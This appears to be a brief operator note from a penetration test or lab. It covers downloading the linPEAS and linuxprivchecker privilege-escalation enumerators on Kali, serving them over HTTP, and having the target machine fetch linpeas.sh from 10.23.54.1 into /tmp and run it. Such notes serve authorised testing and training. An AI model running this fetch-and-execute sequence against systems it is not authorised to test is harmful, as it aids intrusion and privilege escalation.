Fetch enumerators on Kali, then serve this folder.

linPEAS (primary):
  curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh

linuxprivchecker (optional alternative):
  curl -L https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py -o linuxprivchecker.py

Serve (bind all interfaces so the target can reach you):
  python3 -m http.server 8000 --bind 0.0.0.0

On the target, confirm the gateway first:
  ip route
  curl http://10.23.54.1:8000/linpeas.sh -o /tmp/linpeas.sh
  chmod +x /tmp/linpeas.sh
  /tmp/linpeas.sh
